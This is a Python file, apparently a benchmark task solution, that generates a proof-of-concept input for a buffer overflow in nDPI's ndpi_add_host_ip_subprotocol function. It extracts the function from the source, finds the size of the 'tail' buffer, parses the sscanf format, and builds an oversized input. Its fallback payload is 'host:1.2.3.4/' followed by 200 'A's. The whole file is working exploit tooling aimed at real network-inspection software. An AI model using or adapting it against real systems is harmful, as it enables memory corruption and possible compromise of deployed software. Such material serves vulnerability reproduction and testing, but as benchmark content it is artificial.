import os
import re
import tarfile

def _read_file_from_tar(tar_path, target_names):
    try:
        with tarfile.open(tar_path, 'r:*') as tf:
            # Prefer exact path if given, else any basename match
            members = tf.getmembers()
            # First, try exact path matches
            for name in target_names:
                for m in members:
                    if m.name.endswith(name):
                        f = tf.extractfile(m)
                        if f:
                            return f.read().decode('utf-8', errors='ignore')
            # Then, try basename matches
            basenames = set(os.path.basename(n) for n in target_names)
            for m in members:
                if os.path.basename(m.name) in basenames:
                    f = tf.extractfile(m)
                    if f:
                        return f.read().decode('utf-8', errors='ignore')
    except Exception:
        pass
    return None

def _read_file_from_dir(dir_path, target_names):
    for root, _, files in os.walk(dir_path):
        for fn in files:
            for tn in target_names:
                if fn == os.path.basename(tn) or os.path.join(root, fn).endswith(tn):
                    p = os.path.join(root, fn)
                    try:
                        with open(p, 'r', encoding='utf-8', errors='ignore') as f:
                            return f.read()
                    except Exception:
                        continue
    return None

def _extract_function_block(src, func_name):
    # Find function declaration
    m = re.search(r'\b' + re.escape(func_name) + r'\b\s*\(', src)
    if not m:
        return None
    i = m.end() - 1
    # Find opening brace
    # Move to the first '{' after matching ')'
    depth_paren = 1
    j = i + 1
    in_s = False
    in_c = False
    while j < len(src) and depth_paren > 0:
        ch = src[j]
        if in_s:
            if ch == '\\':
                j += 2
                continue
            elif ch == '"':
                in_s = False
        elif in_c:
            if ch == '\\':
                j += 2
                continue
            elif ch == "'":
                in_c = False
        else:
            if ch == '(':
                depth_paren += 1
            elif ch == ')':
                depth_paren -= 1
            elif ch == '"':
                in_s = True
            elif ch == "'":
                in_c = True
        j += 1
    if depth_paren != 0:
        return None
    # find next '{'
    while j < len(src) and src[j] != '{':
        j += 1
    if j >= len(src) or src[j] != '{':
        return None
    start = j
    # Now find matching closing brace
    depth_brace = 0
    in_s = False
    in_c = False
    k = start
    while k < len(src):
        ch = src[k]
        if in_s:
            if ch == '\\':
                k += 2
                continue
            elif ch == '"':
                in_s = False
        elif in_c:
            if ch == '\\':
                k += 2
                continue
            elif ch == "'":
                in_c = False
        else:
            if ch == '{':
                depth_brace += 1
            elif ch == '}':
                depth_brace -= 1
                if depth_brace == 0:
                    return src[start:k+1]
            elif ch == '"':
                in_s = True
            elif ch == "'":
                in_c = True
        k += 1
    return None

def _find_tail_size(func_src):
    # Try various definitions
    patterns = [
        r'\bchar\s+tail\s*\[\s*(\d+)\s*\]',
        r'\b(?:u?_?int8_t|uint8_t|int8_t|u_char|uchar)\s+tail\s*\[\s*(\d+)\s*\]',
    ]
    for pat in patterns:
        m = re.search(pat, func_src)
        if m:
            try:
                return int(m.group(1))
            except Exception:
                pass
    return None

def _find_matching_paren(s, start_idx):
    # start_idx is index of '('
    depth = 0
    in_s = False
    in_c = False
    i = start_idx
    while i < len(s):
        ch = s[i]
        if in_s:
            if ch == '\\':
                i += 2
                continue
            elif ch == '"':
                in_s = False
        elif in_c:
            if ch == '\\':
                i += 2
                continue
            elif ch == "'":
                in_c = False
        else:
            if ch == '(':
                depth += 1
            elif ch == ')':
                depth -= 1
                if depth == 0:
                    return i
            elif ch == '"':
                in_s = True
            elif ch == "'":
                in_c = True
        i += 1
    return None

def _split_top_level_commas(s):
    args = []
    cur = []
    depth_paren = 0
    depth_brack = 0
    depth_brace = 0
    in_s = False
    in_c = False
    i = 0
    while i < len(s):
        ch = s[i]
        if in_s:
            cur.append(ch)
            if ch == '\\':
                # Skip escape next char
                i += 2
                continue
            elif ch == '"':
                in_s = False
        elif in_c:
            cur.append(ch)
            if ch == '\\':
                i += 2
                continue
            elif ch == "'":
                in_c = False
        else:
            if ch == '"':
                in_s = True
                cur.append(ch)
            elif ch == "'":
                in_c = True
                cur.append(ch)
            elif ch == '(':
                depth_paren += 1
                cur.append(ch)
            elif ch == ')':
                depth_paren -= 1
                cur.append(ch)
            elif ch == '[':
                depth_brack += 1
                cur.append(ch)
            elif ch == ']':
                depth_brack -= 1
                cur.append(ch)
            elif ch == '{':
                depth_brace += 1
                cur.append(ch)
            elif ch == '}':
                depth_brace -= 1
                cur.append(ch)
            elif ch == ',' and depth_paren == 0 and depth_brack == 0 and depth_brace == 0:
                args.append(''.join(cur).strip())
                cur = []
            else:
                cur.append(ch)
        i += 1
    if cur:
        args.append(''.join(cur).strip())
    return args

def _decode_c_string_literal_token(token):
    # token includes surrounding quotes
    if len(token) < 2 or token[0] != '"' or token[-1] != '"':
        return None
    s = token[1:-1]
    out = []
    i = 0
    while i < len(s):
        ch = s[i]
        if ch != '\\':
            out.append(ch)
            i += 1
        else:
            i += 1
            if i >= len(s):
                out.append('\\')
                break
            esc = s[i]
            i += 1
            if esc == 'n':
                out.append('\n')
            elif esc == 't':
                out.append('\t')
            elif esc == 'r':
                out.append('\r')
            elif esc == 'v':
                out.append('\v')
            elif esc == 'f':
                out.append('\f')
            elif esc == 'a':
                out.append('\a')
            elif esc == 'b':
                out.append('\b')
            elif esc == '\\':
                out.append('\\')
            elif esc == '"':
                out.append('"')
            elif esc == "'":
                out.append("'")
            elif esc in '01234567':
                # Octal: we already consumed first digit 'esc'
                digits = [esc]
                for _ in range(2):
                    if i < len(s) and s[i] in '01234567':
                        digits.append(s[i])
                        i += 1
                    else:
                        break
                try:
                    out.append(chr(int(''.join(digits), 8)))
                except Exception:
                    out.append('?')
            elif esc == 'x':
                # Hex, any number of hex digits
                digits = []
                while i < len(s) and (s[i].isdigit() or s[i].lower() in 'abcdef'):
                    digits.append(s[i])
                    i += 1
                if digits:
                    try:
                        out.append(chr(int(''.join(digits), 16)))
                    except Exception:
                        out.append('?')
                else:
                    out.append('x')
            else:
                # Unknown escape, keep as-is
                out.append(esc)
    return ''.join(out)

def _parse_c_string_literal(expr):
    # expr may be a sequence of adjacent string literals possibly with whitespace
    # e.g., "%d" ":%s"
    # Return concatenated decoded string or None
    expr = expr.strip()
    tokens = []
    i = 0
    while i < len(expr):
        while i < len(expr) and expr[i].isspace():
            i += 1
        if i >= len(expr):
            break
        if expr[i] != '"':
            return None
        # find end of literal
        j = i + 1
        while j < len(expr):
            ch = expr[j]
            if ch == '\\':
                j += 2
                continue
            if ch == '"':
                break
            j += 1
        if j >= len(expr) or expr[j] != '"':
            return None
        token = expr[i:j+1]
        tokens.append(token)
        i = j + 1
    if not tokens:
        return None
    parts = []
    for t in tokens:
        dec = _decode_c_string_literal_token(t)
        if dec is None:
            return None
        parts.append(dec)
    return ''.join(parts)

def _parse_scanf_format(fmt):
    # Return list of dict descriptors: each item for a conversion that needs an argument AND not suppressed
    # Also returns a list of all conversion descriptors (including suppressed and ones that do not need arguments).
    conversions_all = []
    conversions_needing_arg = []
    i = 0
    while i < len(fmt):
        ch = fmt[i]
        if ch != '%':
            i += 1
            continue
        i += 1
        if i >= len(fmt):
            break
        if fmt[i] == '%':
            # literal percent
            conversions_all.append({'type': '%', 'suppressed': True, 'needs_arg': False, 'raw': '%%'})
            i += 1
            continue
        suppressed = False
        if fmt[i] == '*':
            suppressed = True
            i += 1
        # width digits
        width = ''
        while i < len(fmt) and fmt[i].isdigit():
            width += fmt[i]
            i += 1
        # length modifiers (not really needed)
        # Accept h, hh, l, ll, L, z, j, t
        if i < len(fmt):
            if fmt[i] in 'hlLjzt':
                lm = fmt[i]
                i += 1
                if lm in ('h', 'l') and i < len(fmt) and fmt[i] == lm:
                    # hh or ll
                    i += 1
            # else leave as is
        if i >= len(fmt):
            break
        conv_char = fmt[i]
        i += 1
        desc = {'type': conv_char, 'suppressed': suppressed, 'needs_arg': True, 'width': width}
        raw = '%' + ('*' if suppressed else '') + width + conv_char
        if conv_char == '[':
            # parse scanset
            start = i
            # Scanset may start with '^' or ']' included as first char
            if i < len(fmt) and fmt[i] == '^':
                i += 1
            if i < len(fmt) and fmt[i] == ']':
                i += 1
            while i < len(fmt) and fmt[i] != ']':
                i += 1
            scan_end = i
            if i < len(fmt) and fmt[i] == ']':
                i += 1
            scanset = fmt[start:scan_end]
            desc['type'] = '['
            desc['scanset'] = scanset
            raw = '%' + ('*' if suppressed else '') + width + '[' + scanset + ']'
        elif conv_char == 'n':
            # does not consume input but needs arg
            pass
        elif conv_char in 'cspdiouxXaeEfFgG':
            pass
        else:
            # unknown; treat as needs arg to be safe
            pass
        desc['raw'] = raw
        conversions_all.append(desc)
        if not suppressed and desc.get('needs_arg', True):
            conversions_needing_arg.append(desc)
    return conversions_all, conversions_needing_arg

def _needs_argument(conv_char):
    # For scanf, all except '%%'
    return True

def _char_set_from_scanset(scanset):
    # Return a set of allowed characters if positive set, or a set of excluded characters if negative
    # Also a flag is_complement
    is_complement = False
    s = scanset
    if s.startswith('^'):
        is_complement = True
        s = s[1:]
    chars = set()
    i = 0
    # If first char is ']' it is included as a member
    if i < len(s) and s[i] == ']':
        chars.add(']')
        i += 1
    while i < len(s):
        ch = s[i]
        if i + 2 < len(s) and s[i+1] == '-' and s[i+2] != ']':
            start = s[i]
            end = s[i+2]
            i += 3
            try:
                for code in range(ord(start), ord(end) + 1):
                    chars.add(chr(code))
            except Exception:
                chars.add(ch)
                chars.add(s[i-2])
        else:
            chars.add(ch)
            i += 1
    return chars, is_complement

def _choose_char_for_scanset(scanset):
    allowed_chars, is_complement = _char_set_from_scanset(scanset)
    # Candidate pool of printable non-whitespace first
    candidates = [c for c in ('A','a','0','1','b','B','C','x','y','z','Z','9','-','_','@')]
    if not is_complement:
        for c in candidates:
            if c in allowed_chars:
                return c
        # fallback: try any char in allowed set that is printable
        for c in allowed_chars:
            if 32 <= ord(c) <= 126:
                return c
        # fallback: just 'A'
        return 'A'
    else:
        # Complement: choose a char not in the excluded set
        # Avoid whitespace if possible
        for c in candidates:
            if c not in allowed_chars:
                return c
        # fallback to 'q'
        for code in range(33, 127):
            c = chr(code)
            if c not in allowed_chars:
                return c
        # last resort: 'A'
        return 'A'

def _build_input_for_format(fmt, target_index, tail_len):
    # target_index: index among conversions needing arg (unsuppressed) which corresponds to 'tail'
    # Build string that matches fmt and yields tail string of length tail_len
    res = []
    i = 0
    unsupp_idx = 0  # index among conversions needing arg
    while i < len(fmt):
        ch = fmt[i]
        if ch == '%':
            i += 1
            if i >= len(fmt):
                break
            if fmt[i] == '%':
                res.append('%')
                i += 1
                continue
            suppressed = False
            if fmt[i] == '*':
                suppressed = True
                i += 1
            # width
            width = ''
            while i < len(fmt) and fmt[i].isdigit():
                width += fmt[i]
                i += 1
            # length spec
            if i < len(fmt) and fmt[i] in 'hlLjzt':
                lm = fmt[i]
                i += 1
                if i < len(fmt) and fmt[i] == lm and lm in ('h','l'):
                    i += 1
            if i >= len(fmt):
                break
            conv = fmt[i]
            i += 1
            scanset = None
            if conv == '[':
                start = i
                if i < len(fmt) and fmt[i] == '^':
                    i += 1
                if i < len(fmt) and fmt[i] == ']':
                    i += 1
                while i < len(fmt) and fmt[i] != ']':
                    i += 1
                scan_end = i
                if i < len(fmt) and fmt[i] == ']':
                    i += 1
                scanset = fmt[start:scan_end]
                conv_char = '['
            else:
                conv_char = conv
            needs_arg = True  # assume
            if not suppressed and needs_arg:
                is_target = (unsupp_idx == target_index)
            else:
                is_target = False
            # produce token
            token = ''
            if conv_char == 'n':
                # Does not consume input, just writes count. Provide nothing.
                token = ''
            elif conv_char == 'c':
                # Reads one char (or width count). We'll give one non-whitespace
                w = 1
                if width:
                    try:
                        w = max(1, int(width))
                    except Exception:
                        w = 1
                token = 'A' * w
            elif conv_char in ('d','i','u','o','x','X','p'):
                token = '0'
            elif conv_char in ('a','A','e','E','f','F','g','G'):
                token = '0'
            elif conv_char == 's':
                if is_target:
                    # To ensure %s stops, we will end the input after this or put whitespace after. We will end input.
                    token = 'A' * max(1, tail_len)
                else:
                    token = 'a'
            elif conv_char == '[':
                ch_choice = _choose_char_for_scanset(scanset)
                if is_target:
                    token = ch_choice * max(1, tail_len)
                else:
                    token = ch_choice
            else:
                token = 'a'
            if not suppressed and needs_arg:
                unsupp_idx += 1
            res.append(token)
        elif ch.isspace():
            # One space is enough for any amount of whitespace in format
            res.append(' ')
            i += 1
        else:
            # literal char
            res.append(ch)
            i += 1
    return ''.join(res)

def _find_sscanf_calls_with_tail(func_src):
    calls = []
    for m in re.finditer(r'\bsscanf\s*\(', func_src):
        start = m.end() - 1
        end = _find_matching_paren(func_src, start)
        if end is None:
            continue
        args_str = func_src[start+1:end]
        args = _split_top_level_commas(args_str)
        if len(args) < 3:
            continue
        fmt_expr = args[1]
        fmt = _parse_c_string_literal(fmt_expr)
        if not fmt:
            continue
        # Map arguments to conversions
        _, conv_needing = _parse_scanf_format(fmt)
        arg_after = args[2:]
        # We only consider if sizes match or at least tail can be mapped
        # We'll try to find 'tail' in arg_after and get its index
        idx_candidates = [i for i, a in enumerate(arg_after) if re.search(r'\btail\b', a)]
        if not idx_candidates:
            continue
        # pick the first that maps within conv_needing
        for idx in idx_candidates:
            if idx < len(conv_needing):
                calls.append((fmt, idx))
                break
    return calls

def _build_poc_from_source(src):
    func_name = 'ndpi_add_host_ip_subprotocol'
    func = _extract_function_block(src, func_name)
    if not func:
        return None
    tail_size = _find_tail_size(func)
    tail_len = (tail_size + 1) if (tail_size is not None and tail_size < 2048) else 128
    calls = _find_sscanf_calls_with_tail(func)
    if not calls:
        return None
    # Prefer a call where tail specifier is %s (since this matches vuln report), but we only have fmt string
    # We'll pick the first call as default
    fmt, idx = calls[0]
    poc = _build_input_for_format(fmt, idx, tail_len)
    # ensure newline at end to simulate typical fgets input
    if not poc.endswith('\n'):
        poc = poc + '\n'
    return poc.encode('utf-8', errors='ignore')

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try reading ndpi_main.c from tar or dir
        candidate_paths = [
            'src/lib/ndpi_main.c',
            'ndpi_main.c',
            'src/ndpi_main.c',
            'nDPI/src/lib/ndpi_main.c'
        ]
        src = None
        if os.path.isfile(src_path):
            src = _read_file_from_tar(src_path, candidate_paths)
        elif os.path.isdir(src_path):
            src = _read_file_from_dir(src_path, candidate_paths)
        poc = None
        if src:
            poc = _build_poc_from_source(src)
        if poc:
            return poc
        # Fallback generic PoC targeting common pattern with "/" tail after IP or token
        # Try to keep length moderate but overflowing typical small tail buffers.
        base = "host:1.2.3.4/"
        tail = "A" * 200
        s = base + tail + "\n"
        return s.encode('utf-8', errors='ignore')
